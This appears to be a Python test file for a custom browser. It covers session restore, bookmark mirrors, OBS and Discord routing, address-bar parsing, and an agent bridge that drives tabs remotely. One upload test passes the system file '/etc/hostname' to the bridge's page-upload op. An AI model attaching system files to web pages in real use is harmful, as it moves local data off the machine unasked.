          _full265 >= 3 and _writes265 and all(
              n == _full265 + _others265 for n in _writes265),
          str((_full265, _others265, _writes265)))
finally:
    _w265.__dict__.pop("_write_session_state", None)
    _end266(_w265)
    for _k, _v in (("sessionTabs", _st265), ("tabGroups", _tg265)):
        if _v == "__absent__":
            br.config.pop(_k, None)
        else:
            br.config[_k] = _v
H.spin(200)

# 265 a saved tab of a browser that is gone opens in main, not the active one
_w265b = _mk266()
try:
    _w265b.sessions.append({"name": "O265", "sid": "other265"})
    _w265b.active_session = "other265"
    _v265 = _w265b.open_tab_state(
        [{"u": srv.url("/twhome?g265"), "t": "g", "s": "gone265"}],
        lazy=True)
    _sid265 = getattr(_v265[0], "session", None) if _v265 else None
    check("265 a tab of a deleted browser opens in main, not the active "
          "browser's jar", _sid265 == "main", str(_sid265))
finally:
    _w265b.active_session = "main"
    _w265b.sessions = [e for e in _w265b.sessions if e["sid"] != "other265"]
    _end266(_w265b)
H.spin(200)

# 266 closing a virtual browser closes its split half and its mini windows
_w266 = _mk266()
_mini266 = None
try:
    if not any(e["sid"] == "s266" for e in br.sessions):
        br.sessions.append({"name": "S266", "sid": "s266"})
    if not any(e["sid"] == "s266" for e in _w266.sessions):
        _w266.sessions.append({"name": "S266", "sid": "s266"})
    _a266 = _w266.new_tab(url=srv.url("/twhome?a266"), switch=False,
                          session="s266")
    _b266 = _w266.new_tab(url=srv.url("/twother?b266"), switch=False,
                          session="s266")
    H.spin(300)
    _w266.split_view(index=_w266.tabs.indexOf(_b266), on=True)
    H.spin(200)
    _mini266 = _w266.pop_out_tab(_w266.tabs.indexOf(_a266))
    H.spin(200)
    _before266 = (_w266._split_view is _b266 and _mini266 is not None
                  and len(_w266._popouts) == 1)
    _w266._close_session("s266")
    H.spin(300)
    _split266 = getattr(_w266, "_split_view", None)
    _minis266 = [m for m in _w266._popouts
                 if (getattr(m, "_state", None) or {}).get("session")
                 == "s266"]
    _rows266 = _w266._session_rows()[1].get("s266")
    check("266 closing a virtual browser closes its split half and its "
          "popped-out tabs",
          _before266 and _split266 is None and not _minis266
          and not _rows266,
          str((_before266, _split266, len(_minis266), _rows266)))
finally:
    br.sessions = [e for e in br.sessions if e["sid"] != "s266"]
    _end266(_w266)
H.spin(200)

# 266 the last window, after the writer hand-off, writes its own session
_w266b = _mk266()
_saved266 = list(B.WINDOWS)
_app266 = B.QApplication.instance()
_calls266 = []
try:
    _w266b._session_timer.start()           # it holds the writer role
    _w266b._save_groups = lambda quiet=False: _calls266.append("save")
    _w266b._clear_on_exit = lambda: _calls266.append("clear")
    _app266.quit = lambda: _calls266.append("quit")
    B.WINDOWS[:] = [_w266b]                 # the only window left
    _w266b._closing_anyway = True
    _w266b.close()
finally:
    _app266.__dict__.pop("quit", None)
    B.WINDOWS[:] = _saved266
    try:
        _w266b._session_timer.stop()
    except RuntimeError:
        pass
check("266 the last window saves its session before it quits",
      _calls266[:1] == ["save"] and "quit" in _calls266,
      str(_calls266))
H.spin(200)

# ---- 267: a mirror folder two machines share keeps both sides for "merge" ----
_mdir267 = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
(_mdir267 / "bookmarks-other267.json").write_text(json.dumps([
    {"id": 9001, "type": "link", "title": "from the other machine",
     "url": "https://other267.example/", "parent": 0}]), encoding="utf-8")
_bm_was267 = json.loads(json.dumps(br.bookmarks))
try:
    br.mirror_bookmarks(folder=str(_mdir267))       # this machine's save
    _added267 = br.merge_bookmark_mirror(folder=str(_mdir267))
    _have267 = any(e.get("url") == "https://other267.example/"
                   for e in br.bookmarks)
    _again267 = br.merge_bookmark_mirror(folder=str(_mdir267))
finally:
    br.bookmarks = _bm_was267
    br.save_bookmarks()
    import shutil as _sh267
    _sh267.rmtree(str(_mdir267), ignore_errors=True)
check("267 merge takes back the other machine's bookmarks after this one saved",
      _added267 == 1 and _have267 and _again267 == 0,
      str((_added267, _have267, _again267)))

# ---- 268: an OBS refusal is said as one; Discord links stay out of private tabs ----
class _Link268:
    def __init__(self, browser, url, password):
        pass

    def send(self, request, data, then):
        then({"ok": False, "what": request, "why": "already recording",
              "data": {}})
        return True

    def deleteLater(self):
        pass


_real_link268 = B.ObsLink
_flash268 = []
B.ObsLink = _Link268
br.obs_ready = lambda: True
br.flash = lambda text, *a, **k: _flash268.append(str(text))
try:
    br.obs_send("StartRecord")
finally:
    B.ObsLink = _real_link268
    br.__dict__.pop("obs_ready", None)
    br.__dict__.pop("flash", None)
check("268 an OBS request it refuses is said as refused, not as done",
      _flash268 and "already recording" in _flash268[0]
      and _flash268[0] != br._ui_str("obsDid") % "StartRecord",
      str(_flash268))
_w268 = br.new_window()
H.spin(500)
try:
    _p268 = _w268.new_tab(url=srv.url("/twhome?p268"), private=True)
    _n268 = _w268.new_tab(url=srv.url("/twother?n268"))
    H.wait_for(lambda: "p268" in _p268.url().toString()
               and "n268" in _n268.url().toString(), 8000)
    _got268 = _w268.discord_tab(host="127.0.0.1")
    _priv268 = getattr(_got268, "private", None)
    _is_n268 = _got268 is _n268
finally:
    _w268._confirm_many_tabs = lambda *a, **k: True
    _w268.close()
    H.spin(500)
check("268 a link from a normal tab is routed to a normal Discord tab, not a "
      "private one before it", _is_n268 and not _priv268,
      str((_is_n268, _priv268)))


# ---- 269-271: agent bridge correctness (fill/box/markdown, bookmarks, close, dialog, events,
# watch, rest timeout, pointer, ask, viewport, mine, upload). Insert before the final
# "the suite's own window stayed" check. ----
import agent_bridge as _AB57
import socket as _sock57

_ab57 = _AB57.AgentBridge(br)
_ab57._next_id = 1 + max([10 ** 6] + [
    int(getattr(br.tabs.widget(_i), "_agent_id", 0) or 0)
    for _i in range(br.tabs.count())])
_out57 = []
_ab57._reply = lambda conn, payload: _out57.append(payload)
_keys57 = ("bridgeLevel", "bridgeSites", "bridgeOps", "bridgeAudit",
           "agentTabIdle")
_save57 = {k: br.config.get(k, "__absent__") for k in _keys57}
for _k57 in ("bridgeLevel", "bridgeSites", "bridgeOps"):
    br.config.pop(_k57, None)
_bm57 = list(br.bookmarks)
H.Handler.pages["/t269"] = (
    "<title>t269</title><input id=a><input id=c>"
    "<iframe id=f srcdoc='<input id=i><button id=b>hi there</button>'>"
    "</iframe>")


def _tid57(v):
    _ab57._views()
    return v._agent_id


def _ask57(req, wait=True):
    del _out57[:]
    _ab57._dispatch(None, json.dumps(req).encode())
    if wait:
        H.wait_for(lambda: bool(_out57), 6000)
    return _out57[-1] if _out57 else None


class _Sig57:
    def __init__(self):
        self.fns = []

    def connect(self, fn):
        self.fns.append(fn)


class _Conn57:
    def __init__(self, connected=True, data=b""):
        self.connected = connected
        self.data = data
        self.disconnected = _Sig57()
        self.readyRead = _Sig57()
        self.log = []

    def state(self):
        S = _AB57.QLocalSocket.LocalSocketState
        return S.ConnectedState if self.connected else S.UnconnectedState

    def readAll(self):
        d, self.data = self.data, b""
        return d

    def write(self, b):
        self.log.append(("write", b))

    def flush(self):
        pass

    def deleteLater(self):
        pass

    def abort(self):
        self.log.append(("abort",))

    def disconnectFromServer(self):
        self.log.append(("disconnect",))


_v57 = br.new_tab(url=srv.url("/t269"), switch=True)
try:
    H.wait_for(lambda: "/t269" in _v57.url().toString(), 8000)
    H.wait_for(lambda: jsq(_v57, "!!(document.querySelector('#f') && "
               "document.querySelector('#f').contentDocument && "
               "document.querySelector('#f').contentDocument"
               ".querySelector('#b'))") is True, 8000)
    _t57 = _tid57(_v57)

    # 269: a bad selector in fill is named and the rest of the form is still filled
    _r = _ask57({"op": "fill", "tab": _t57,
                 "fields": {"#a": "x", "input[": "y", "#c": "z"}})
    _vals = (H.js(_v57, "document.querySelector('#a').value"),
             H.js(_v57, "document.querySelector('#c').value"))
    check("269 fill names a bad selector and still fills the other fields",
          bool(_r) and _r.get("ok") is False
          and _r.get("error") == "bad-selector"
          and isinstance(_r.get("result"), dict)
          and _r["result"].get("bad") == ["input["]
          and _r["result"].get("filled") == ["#a", "#c"]
          and _vals == ("x", "z"), str((_r, _vals)))

    # 269: box, markdown and fill take "a >>> b" like click does
    _rb = _ask57({"op": "box", "tab": _t57, "selector": "iframe#f >>> #b"})
    _rm = _ask57({"op": "markdown", "tab": _t57,
                  "selector": "iframe#f >>> #b"})
    _rf = _ask57({"op": "fill", "tab": _t57,
                  "fields": {"iframe#f >>> #i": "inside"}})
    _iv = H.js(_v57, "document.querySelector('#f').contentDocument"
                     ".querySelector('#i').value")
    check("269 box, markdown and fill reach into an iframe with >>>",
          bool(_rb) and (_rb.get("box") or {}).get("tag") == "button"
          and bool(_rm) and "hi there" in (_rm.get("text") or "")
          and bool(_rf) and (_rf.get("result") or {}).get("filled")
          == ["iframe#f >>> #i"] and _iv == "inside",
          str((_rb, _rm, _rf, _iv)))

    # 269: a selector that does not parse is a named error in box and markdown
    _rb2 = _ask57({"op": "box", "tab": _t57, "selector": "input["})
    _rm2 = _ask57({"op": "markdown", "tab": _t57, "selector": "input["})
    check("269 box and markdown answer bad-selector for a selector that "
          "does not parse",
          bool(_rb2) and _rb2.get("error") == "bad-selector"
          and bool(_rm2) and _rm2.get("error") == "bad-selector",
          str((_rb2, _rm2)))

    # 270: bookmarks add with a stale tab id is refused; a lazy tab's address is read
    _n = len(br.bookmarks)
    _rs = _ask57({"op": "bookmarks", "action": "add", "tab": 999999})
    _stale_n = len(br.bookmarks)

    class _LazyUrl57:
        def toString(self):
            return ""

    class _LazyView57:
        _pending = "https://lazy270.example/page"

        def url(self):
            return _LazyUrl57()
    _lazy = _LazyView57()
    _ab57._find = lambda tab: _lazy
    del _out57[:]
    _ab57.op_bookmarks(None, {"action": "add", "tab": 5})
    _ab57.__dict__.pop("_find", None)
    check("270 bookmarks add: a stale tab id is no-such-tab, and a tab never "
          "loaded is bookmarked by its pending address",
          bool(_rs) and _rs.get("error") == "no-such-tab"
          and _stale_n == _n
          and _out57[-1:] and _out57[-1].get("url")
          == "https://lazy270.example/page", str((_rs, _out57[-1:])))
    br.bookmarks[:] = _bm57

    # 270: close never asks a question on the socket handler, and says ok only when closed
    _asked = []
    _real_q = B.QMessageBox.question
    B.QMessageBox.question = lambda *a, **k: (
        _asked.append(1) or B.QMessageBox.StandardButton.No)
    _lk = br.new_tab(url=srv.url("/twhome?t270=1"), switch=False)
    try:
        _lk.locked = True
        _rc = _ask57({"op": "close", "tab": _tid57(_lk)})
        _still = br.tabs.indexOf(_lk) >= 0
        _lk.locked = False
        _rc2 = _ask57({"op": "close", "tab": _tid57(_lk)})
        _gone = br.tabs.indexOf(_lk) < 0
    finally:
        B.QMessageBox.question = _real_q
        _close_if_open(_lk)
    check("270 close refuses a locked tab without a dialog, and ok means "
          "the tab is gone",
          bool(_rc) and _rc.get("ok") is False and _still and not _asked
          and bool(_rc2) and _rc2.get("ok") is True and _gone,
          str((_rc, _still, _asked, _rc2, _gone)))

    # 270: dialog answer null clears it
    _pg = _v57.page()
    _was_ans = getattr(_pg, "dialog_answer", None)
    try:
        _ask57({"op": "dialog", "tab": _t57, "answer": "yes"})
        _rd = _ask57({"op": "dialog", "tab": _t57, "answer": None})
        _after = getattr(_pg, "dialog_answer", "unset")
    finally:
        _pg.dialog_answer = _was_ans
    check("270 dialog answer null clears the stored answer",
          _after is None and bool(_rd) and _rd.get("answer") is None,
          str((_after, _rd)))

    # 270: events kinds as a string is one kind; a non-list is an error
    _c1 = _Conn57()
    _ab57.op_events(_c1, {"kinds": "changed"})
    _rows = [r for r in _ab57.listeners if r["conn"] is _c1]
    _kinds = _rows[0]["kinds"] if _rows else None
    for r in _rows:
        _ab57.listeners.remove(r)
    del _out57[:]
    _c2 = _Conn57()
    _ab57.op_events(_c2, {"kinds": {"a": 1}})
    _bad = [r for r in _ab57.listeners if r["conn"] is _c2]
    for r in _bad:
        _ab57.listeners.remove(r)
    check("270 events: a string kinds is one kind, a dict is refused",
          _kinds == ["changed"] and not _bad and _out57[-1:]
          and _out57[-1].get("ok") is False, str((_kinds, _bad, _out57[-1:])))

    # 270: watch every is clamped, and a watch is only registered once its timer runs
    del _out57[:]
    _err = None
    try:
        _ab57.op_watch(None, {"tab": _t57, "selector": "body",
                              "every": 10 ** 12})
    except Exception as e:
        _err = e
    _rows = list(_ab57.watches.values())
    _ok270 = (_err is None and bool(_out57) and _out57[-1].get("ok") is True
              and _out57[-1].get("every") == 86400
              and all(r.get("timer") is not None and r["timer"].isActive()
                      for r in _rows))
    _zombie = [r for r in _rows if r.get("timer") is None
               or not r["timer"].isActive()]
    for k in list(_ab57.watches):
        _ab57.stop_watch(k)
    check("270 watch clamps every to a day and leaves no zombie row",
          _ok270 and not _zombie, str((_err, _out57[-1:], len(_zombie))))

    # 270: a failed read in a watch tick is not a change
    _ab57.watches[900] = {"id": 900, "tab": _t57, "selector": "body",
                          "every": 60, "was": "abc", "changes": 0}
    _ab57._run = lambda v, code, done, world=None: done(None)
    try:
        _ab57._watch_tick(900)
    finally:
        _ab57.__dict__.pop("_run", None)
    _row = _ab57.watches.pop(900)
    check("270 a failed watch evaluation is ignored, not a change to empty",
          _row["was"] == "abc" and _row["changes"] == 0, str(_row))

    # 270: a request over 8 MB is answered before the hang-up
    class _FakeServer57:
        def __init__(self, conn):
            self.conn = conn
            self.n = 1

        def hasPendingConnections(self):
            self.n -= 1
            return self.n >= 0

        def nextPendingConnection(self):
            return self.conn
    _big = _Conn57(data=b"x" * (8 * 1024 * 1024 + 1))
    _ab57.__dict__.pop("_reply")
    _ab57.server = _FakeServer57(_big)
    try:
        _ab57._accept()
        _big.readyRead.fns[0]()
    finally:
        _ab57.__dict__.pop("server", None)
        _ab57._reply = lambda conn, payload: _out57.append(payload)
    _wrote = b"".join(e[1] for e in _big.log if e[0] == "write")
    check("270 a request over 8 MB gets request-too-large before the "
          "disconnect",
          b"request-too-large" in _wrote
          and ("disconnect",) in _big.log
          and _big.log.index(("write", _wrote)) < _big.log.index(
              ("disconnect",)) if _wrote else False, str(_big.log)[:200])

    # 270: idle stops polling for a client that has gone
    _runs = []
    _ab57._run = lambda v, code, done, world=None: _runs.append(1)
    try:
        _ab57.op_idle(_Conn57(connected=False), {"tab": _t57})
        H.spin(300)
    finally:
        _ab57.__dict__.pop("_run", None)
    check("270 idle does not poll for a client that hung up", not _runs,
          str(_runs))

    # 271: the REST mirror waits as long as the op's own timeout
    class _FakeSock57:
        stamps = []

        def __init__(self, *a, **k):
            pass

        def settimeout(self, t):
            _FakeSock57.stamps.append(t)

        def connect(self, p):
            pass

        def sendall(self, b):
            pass

        def recv(self, n):
            raise _sock57.timeout("timed out")

        def close(self):
            pass
    _real_sock = _sock57.socket
    _sock57.socket = _FakeSock57
    try:
        _rest = _AB57.RestMirror(_ab57, port=0, token="x" * 16)
        _rr = _rest.run({"op": "wait", "selector": "#x", "timeout": 60000})
        # 271c: the documented timeout_ms, and ask's own minute
        _rest.run({"op": "wait", "selector": "#x", "timeout_ms": 60000})
        _rest.run({"op": "ask", "text": "hi"})
    finally:
        _sock57.socket = _real_sock
    check("271c the REST mirror waits for timeout_ms and for ask's minute",
          len(_FakeSock57.stamps) >= 3 and _FakeSock57.stamps[1] >= 60
          and _FakeSock57.stamps[2] >= 75, str(_FakeSock57.stamps))
    check("271 the REST socket waits past the op's timeout and a timeout "
          "is reported as its own error",
          bool(_FakeSock57.stamps) and _FakeSock57.stamps[0] >= 60
          and _rr.get("error") == "rest-timeout",
          str((_FakeSock57.stamps, _rr)))

    # 271: pointer reads every number before posting; toy 0 is a place
    _posted = []

    class _FakeApp57:
        @staticmethod
        def postEvent(target, ev):
            _posted.append(ev)
    _real_app = _AB57.QApplication
    _AB57.QApplication = _FakeApp57
    try:
        del _out57[:]
        _e1 = None
        try:
            _ab57.op_pointer(None, {"tab": _t57, "kind": "drag", "x": 5,
                                    "y": 5, "tox": "abc", "toy": 3})
        except Exception as e:
            _e1 = e
        _bad_posted = len(_posted)
        _bad_reply = _out57[-1:] and _out57[-1].get("error")
        del _posted[:]
        _ab57.op_pointer(None, {"tab": _t57, "kind": "drag", "x": 5,
                                "y": 5, "tox": 10, "toy": 0})
        _end = _posted[-1].position() if _posted else None
    finally:
        _AB57.QApplication = _real_app
    check("271 pointer: a bad coordinate posts nothing, and toy 0 is the "
          "top edge not 'missing'",
          _e1 is None and _bad_posted == 0 and _bad_reply == "bad-argument"
          and _end is not None and int(_end.x()) == 10 and int(_end.y()) == 0,
          str((_e1, _bad_posted, _bad_reply, _end)))

    # 271: ask replies when the page never loads, and when the view is gone
    class _FakeTimer57:
        calls = []

        @staticmethod
        def singleShot(ms, fn):
            _FakeTimer57.calls.append((ms, fn))
    _real_timer = _AB57.QTimer
    _real_views = _ab57._views
    _ab57._views = lambda: []
    br.__dict__["new_tab"] = lambda url=None, switch=True, **k: _v57
    _AB57.QTimer = _FakeTimer57
    _was_owned = getattr(_v57, "_agent_owned", None)
    try:
        del _out57[:]
        _ab57.op_ask(None, {"which": "claude", "text": "hi"})
        _long = [fn for ms, fn in _FakeTimer57.calls if ms >= 30000]
        for fn in _long:
            fn()
        _ask_to = _out57[-1:]
    finally:
        _AB57.QTimer = _real_timer
        br.__dict__.pop("new_tab", None)
        _ab57._views = _real_views
        if _was_owned is None:
            _v57.__dict__.pop("_agent_owned", None)
        _ab57.__dict__.pop("_views", None)
    check("271 ask answers with a timeout error when its tab never loads",
          bool(_ask_to) and _ask_to[0].get("ok") is False
          and _ask_to[0].get("error") == "timeout", str(_ask_to))

    _runs = []
    _ab57._views = lambda: [(0, _v57)]
    _ab57._view_url = lambda v: "https://claude.ai/x"
    _ab57._gone = lambda v: True
    _ab57._run = lambda v, code, done, world=None: _runs.append(1)
    try:
        del _out57[:]
        _e2 = None
        try:
            _ab57.op_ask(None, {"which": "claude", "text": "hi"})
        except Exception as e:
            _e2 = e
        _gone_reply = _out57[-1:]
    finally:
        for _n in ("_views", "_view_url", "_gone", "_run"):
            _ab57.__dict__.pop(_n, None)
    check("271 ask on a deleted view answers no-such-tab and runs nothing",
          _e2 is None and not _runs and bool(_gone_reply)
          and _gone_reply[0].get("error") == "no-such-tab",
          str((_e2, _runs, _gone_reply)))

    # 271: viewport needs both sides, and clamps
    class _FakeView57:
        sizes = []

        def setFixedSize(self, w, h):
            _FakeView57.sizes.append((w, h))

        def width(self):
            return 1

        def height(self):
            return 1
    _fv57 = _FakeView57()
    _resets = []
    br.__dict__["responsive_preview"] = (
        lambda size="", view=None: _resets.append(size) or "")
    _ab57._find = lambda tab: _fv57
    try:
        del _out57[:]
        _ab57.op_viewport(None, {"width": 500})
        _one = _out57[-1:]
        _ab57.op_viewport(None, {"width": 10 ** 7, "height": 300})
    finally:
        br.__dict__.pop("responsive_preview", None)
        _ab57.__dict__.pop("_find", None)
    check("271 viewport with one side is refused and does not reset; sizes "
          "are clamped",
          bool(_one) and _one[0].get("error") == "width-and-height-required"
          and not _resets and _FakeView57.sizes == [(10000, 300)],
          str((_one, _resets, _FakeView57.sizes)))

    # 271: mine idle stores and echoes one clamped value
    del _out57[:]
    _ab57.op_mine(None, {"do": "idle", "after": -5})
    _neg = _out57[-1:]
    _stored = br.config.get("agentTabIdle")
    del _out57[:]
    _e3 = None
    try:
        _ab57.op_mine(None, {"do": "idle", "after": "abc"})
    except Exception as e:
        _e3 = e
    _nan = _out57[-1:]
    check("271 mine idle echoes the clamped value and refuses a non-number",
          bool(_neg) and _neg[0].get("after") == 0 and _stored == 0
          and _e3 is None and bool(_nan) and _nan[0].get("error")
          == "bad-argument", str((_neg, _stored, _e3, _nan)))

    # 271: upload takes a string path as one path and refuses a non-list
    del _out57[:]
    _ab57.op_upload(None, {"tab": _t57, "paths": "/etc/hostname"})
    _up = _out57[-1:]
    del _out57[:]
    _e4 = None
    try:
        _ab57.op_upload(None, {"tab": _t57, "paths": 5})
    except Exception as e:
        _e4 = e
    _up2 = _out57[-1:]
    for _n in ("_agent_files", "_agent_files_for"):
        _v57.page().__dict__.pop(_n, None)
    check("271 upload: a string path is one path, a non-list is an error",
          bool(_up) and _up[0].get("ok") is True
          and _up[0].get("files") == ["/etc/hostname"]
          and _e4 is None and bool(_up2) and _up2[0].get("ok") is False,
          str((_up, _e4, _up2)))
    # 271b: wait reads timeout_ms, the name the op list gives it
    # (a connection that is still there: wait polls only for a live client)
    del _out57[:]
    _tw0 = _time.time()
    _ab57._dispatch(_Conn57(), json.dumps(
        {"op": "wait", "tab": _t57, "selector": "#never271b",
         "timeout_ms": 600}).encode())
    H.wait_for(lambda: bool(_out57), 6000)
    _took = _time.time() - _tw0
    _rw = _out57[-1] if _out57 else None
    check("271b wait honours timeout_ms, the name the op list gives it",
          bool(_rw) and _rw.get("ok") is False
          and "Error" not in str(_rw.get("error", "")) and 0.4 < _took < 5,
          str((_rw, round(_took, 1))))
finally:
    for _k57, _x57 in _save57.items():
        if _x57 == "__absent__":
            br.config.pop(_k57, None)
        else:
            br.config[_k57] = _x57
    br.bookmarks[:] = _bm57
    for _k in list(_ab57.watches):
        _ab57.stop_watch(_k)
    del _ab57.listeners[:]
    H.Handler.pages.pop("/t269", None)
    _close_if_open(_v57)

# ---- 272: the bar's answers (units, hex, zones, dates) ----
import datetime as _dt272
import time as _t272

_m272 = B._metric_answer("it is 1,000 ft tall")
check("272 page text '1,000 ft' is a thousand feet, not 1.0 ft",
      _m272 and _m272[1] == "304.8", str(_m272))
_m272b = B._metric_answer("a 3-5 ft range")
check("272 a range's hyphen is no minus sign",
      not _m272b or not _m272b[1].startswith("-"), str(_m272b))
check("272 '1.234.567 ft' is not read from '234.567 ft'",
      not (B._metric_answer("about 1.234.567 ft") or ("",))[0]
      .startswith("234.567"),
      str(B._metric_answer("about 1.234.567 ft")))
check("272 a typed decimal comma and a real minus still read",
      B._metric_answer("2,5 ft")[1] == "0.762"
      and B._metric_answer("a -5 ft drop")[1] == "-1.524"
      and B._unit_answer("1,5 ft to m")[1] == "0.4572",
      str((B._metric_answer("2,5 ft"), B._metric_answer("a -5 ft drop"))))

check("272 '0bah' and '0b1fh' are hex with an h suffix",
      B._base_answer("0bah") and B._base_answer("0bah")[1] == "186"
      and B._base_answer("0b1fh")[1] == "2847"
      and B._base_answer("0b101")[1] == "5"
      and B._base_answer("1fh")[1] == "31",
      str((B._base_answer("0bah"), B._base_answer("0b1fh"))))

getattr(getattr(B, "_zone_table", None), "cache_clear", lambda: None)()
_z272 = B._zone_for("europe/berlin")
_t0272 = _t272.time()
for _i272 in range(5):
    B._zone_for("xyz%d" % _i272)
_el272 = _t272.time() - _t0272
check("272 a lower-case 'europe/berlin' resolves, and misses are cached",
      _z272 == "Europe/Berlin" and B._zone_for("berlin") == "Europe/Berlin"
      and _el272 < 0.2, str((_z272, round(_el272, 3))))

_t272d = _dt272.date.today()
_want272 = next(_dt272.date(y, 2, 29) for y in range(_t272d.year, _t272d.year + 9)
                if y % 4 == 0 and (y % 100 or y % 400 == 0)
                and _dt272.date(y, 2, 29) >= _t272d)
check("272 'days until 29.2.' waits for the next leap year",
      B._parse_date("29.2.", _t272d) == _want272,
      str(B._parse_date("29.2.", _t272d)))

check("272 'in' before a digit, comma or hyphen is no inch",
      B._metric_answer("rated 5 in 2019") is None
      and B._metric_answer("5 in-depth review") is None
      and B._metric_answer("I got 3 in, 4 out") is None
      and B._metric_answer("a 5 in long nail")[1] == "127",
      str((B._metric_answer("rated 5 in 2019"),
           B._metric_answer("5 in-depth review"))))

check("272 a malformed full date is no day.month of this year",
      B._parse_date("24.12.202", _t272d) is None
      and B._parse_date("24.12.20267", _t272d) is None
      and B._parse_date("1.1.2030 12:00", _t272d) is None
      and B._parse_date("24.12.", _t272d) is not None
      and B._parse_date("24.12", _t272d) is not None
      and B._parse_date("24.12.2030", _t272d) == _dt272.date(2030, 12, 24),
      str((B._parse_date("24.12.202", _t272d),
           B._parse_date("1.1.2030 12:00", _t272d))))

# ---- 273: the bar's drop-down rows ----
_hist273, _act273 = list(br.history), getattr(br, "_suggest_actions", None)
_long273 = "https://zz273.example/" + "a" * 70
_now273 = int(_time.time())
br.history = [
    {"url": _long273 + "/new", "title": "zz273 same title", "t": _now273 - 5},
    {"url": _long273 + "/old", "title": "zz273 same title", "t": _now273 - 50}]
try:
    _rows273 = [r for r in br._own_suggestions("zz273") if "zz273" in r]
    _acts273 = dict(br._suggest_actions)
    _urls273 = sorted(_acts273[r][1] for r in _rows273 if r in _acts273)
finally:
    br.history = _hist273
    br._suggest_actions = _act273 or {}
check("273 two rows with one truncated label each keep their own address",
      len(_rows273) == 2 and len(set(_rows273)) == 2
      and _urls273 == [_long273 + "/new", _long273 + "/old"],
      str((_rows273, _urls273)))


class _V273:
    def __init__(self, url):
        self._u = url

    def url(self):
        return self

    def toString(self):
        return self._u


def _never_rows273(want_never):
    host = "never273.example"
    _tab = _V273("https://%s/a" % host)
    _short_was = dict(br._short_links)
    _shown = []
    br.__dict__["_real_tabs"] = lambda *a, **k: [(0, _tab)]
    br.__dict__["_tab_title"] = lambda i: "never273 tab"
    # the stand-in tab is no widget: the strip's own indexOf refuses it
    br.tabs.__dict__["indexOf"] = lambda w: 0
    br.__dict__["other_window_tabs"] = lambda t: [
        {"window": br, "view": _tab, "title": "never273 elsewhere",
         "url": "https://%s/b" % host}] if "never273" in t else []
    br._short_links["https://zz273s.example/x"] = "https://%s/land" % host
    br.never_suggest(host, on=want_never)
    try:
        rows = br._own_suggestions("never273")
        rows += br._own_suggestions("zz273s.example/x")
    finally:
        br.never_suggest(host, on=False)
        for k in ("_real_tabs", "_tab_title", "other_window_tabs"):
            br.__dict__.pop(k, None)
        br.tabs.__dict__.pop("indexOf", None)
        br._short_links.clear()
        br._short_links.update(_short_was)
        br._suggest_actions = {}
    return rows


_open273 = _never_rows273(False)
_shut273 = _never_rows273(True)
check("273 never-suggest also keeps out open tabs, other windows' tabs "
      "and short-link rows",
      len([r for r in _open273 if "never273" in r]) == 3
      and any("never273.example/land" in r for r in _open273)
      and not [r for r in _shut273 if "never273" in r], str((_open273, _shut273)))


# ---- 274/275: tab sets, stale tabs, restore_day and workspaces ----------
def _open274(win, view):
    try:
        return win.tabs.indexOf(view) >= 0
    except RuntimeError:
        return False


def _find275(win, mark):
    return [v for _i, v in win._real_tabs() if mark in win._tab_url(v)]


_cfg274 = {k: br.config.get(k, "__absent__")
           for k in ("tabSets", "staleDays", "workspaces", "workspaceNow",
                     "noRestoreSites")}
_tw274 = list(br.throwaway_sessions())
_w274 = br.new_window()
try:
    H.spin(600)
    # 274: "open it instead of these tabs" leaves the locked, pinned, game
    # and audible tabs open and closes the plain one
    _L = _w274.new_tab(url=srv.url("/twhome?l274"), switch=False)
    _P = _w274.new_tab(url=srv.url("/twhome?p274"), switch=False)
    _G = _w274.new_tab(url=srv.url("/twhome?g274"), switch=False)
    _A = _w274.new_tab(url=srv.url("/twhome?a274"), switch=False)
    _N = _w274.new_tab(url=srv.url("/twhome?n274"), switch=False)
    H.spin(600)
    _L.locked = True
    _w274.pin_tab(_w274.tabs.indexOf(_P), True)
    _G._game = True
    _A.page().recentlyAudible = lambda: True
    br.config["tabSets"] = {"s274": {"t": 1, "tabs": [
        {"u": srv.url("/twother?set274"), "t": "set"}]}}
    _opened274 = _w274.restore_tabset("s274", replace=True)
    H.spin(300)
    _kept274 = [_open274(_w274, v) for v in (_L, _P, _G, _A)]
    check("274 replacing a set keeps locked, pinned, game and audible tabs "
          "and closes the plain one",
          bool(_opened274) and all(_kept274) and not _open274(_w274, _N),
          str((_kept274, _open274(_w274, _N))))
    # 274b: the stale closer spares a game and a sound, not a plain tab
    _S = _w274.new_tab(url=srv.url("/twhome?s274"), switch=False)
    _G2 = _w274.new_tab(url=srv.url("/twhome?g2274"), switch=False)
    _A2 = _w274.new_tab(url=srv.url("/twhome?a2274"), switch=False)
    H.spin(500)
    _G2._game = True
    _A2.page().recentlyAudible = lambda: True
    for _v in (_S, _G2, _A2):
        _v._seen_wall = _time.time() - 9 * 86400
    _w274.tabs.setCurrentWidget(_opened274[0])
    br.config["staleDays"] = 1
    _w274.close_stale_tabs()
    H.spin(200)
    check("274 the stale closer leaves a game tab and an audible tab",
          not _open274(_w274, _S) and _open274(_w274, _G2)
          and _open274(_w274, _A2),
          str((_open274(_w274, _S), _open274(_w274, _G2),
               _open274(_w274, _A2))))
    # 274c: restore_day keeps a page read in two browsers and groups each
    _w274.sessions.append({"name": "X274", "sid": "x274"})
    _cap274 = []
    _w274.history_rows = lambda **k: [
        {"url": "http://same274.example/", "title": "a", "s": "x274",
         "t": 5},
        {"url": "http://same274.example/", "title": "a", "s": "main",
         "t": 4}]
    _w274.open_tab_state = lambda entries, lazy=True, **k: (
        _cap274.extend(entries) or [])
    _w274.restore_day(0, as_group="G274")
    _gs274 = {(e["s"], e.get("g")) for e in _cap274}
    check("274 restore_day opens a page read in two browsers in both, "
          "each in a group of its own browser",
          len(_cap274) == 2 and {s for s, _g in _gs274} == {"main", "x274"}
          and all(g and _w274.group_sessions.get(g) == s
                  for s, g in _gs274), str(_cap274))
finally:
    _w274.__dict__.pop("history_rows", None)
    _w274.__dict__.pop("open_tab_state", None)
    for _k, _o in _cfg274.items():
        if _o == "__absent__":
            br.config.pop(_k, None)
        else:
            br.config[_k] = _o
    _w274._confirm_many_tabs = lambda *a, **k: True
    _w274.close()
    H.spin(500)

_w275 = br.new_window()
try:
    H.spin(600)
    # 275d: nothing to save (the start page) is not written over a set
    _w275.flash = lambda *a, **k: None
    br.config["workspaces"] = {"e275": [{"u": "http://old275.example/",
                                         "t": "old", "s": "main"}]}
    _r275d = _w275.save_workspace("e275")
    check("275 an empty save does not replace a set of the same name",
          _r275d is False and len(br.workspaces()["e275"]) == 1
          and br.workspaces()["e275"][0]["u"] == "http://old275.example/",
          str((_r275d, br.workspaces())))
